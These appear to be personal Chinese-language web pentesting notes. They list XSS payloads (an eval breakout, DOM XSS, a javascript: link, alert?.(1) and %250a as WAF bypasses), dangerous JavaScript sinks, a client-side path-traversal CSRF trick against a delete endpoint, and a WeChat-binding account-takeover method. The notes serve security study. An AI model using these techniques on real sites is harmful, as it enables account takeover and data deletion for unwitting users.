```JavaScript
eval("console.log('"+"')-alert()//"+"')");
注释只会注释当前部分，不会全部注释掉，就是最后一个双引号之前的会注释掉
```
危险函数：settimeout，eval，location，innerhtml等

```
var name = '1' -alert(1)
典型的domxss
```

```
<a href=javascript:alert%28%29>test</a>
```

```
alert?.(1)
可以绕waf
```

CSRF的客户端路径穿越
/api/user/del/info?id=fever
可能造成的后端请求是
/api/user/del/info/id/fever
那么我们可以
```
/api/user/del/info?id=../../fever
```
造成受害者发送这样的请求，会带上自己的csrftoken
```
/api/user/del/fever
```
这是发生在客户端的

不要太过于关注包的样子，只要管包的功能是不是这样

第三方功能点，绑定微信的功能点，扫码后发包code=afhbawuifhuaw，我们拦截这个包，然后用小号（受害者）去发这个包（可以通过csrf），然后就会把当前业务绑定到我们大号（攻击者的微信），从而进行接管当前的账号

11.27

12.20
%250a
打乱参数顺序绕过xsswaf